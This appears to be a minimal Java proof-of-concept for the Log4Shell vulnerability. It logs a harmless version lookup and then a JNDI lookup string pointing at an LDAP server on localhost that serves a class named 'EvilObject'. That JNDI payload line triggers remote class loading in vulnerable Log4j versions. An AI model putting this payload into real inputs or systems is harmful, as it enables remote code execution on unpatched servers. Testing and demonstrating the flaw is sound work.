import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(Main.class);
        logger.error("${java:version}");
        logger.error("${jndi:ldap://127.0.0.1:9999/EvilObject.class}");
    }
}
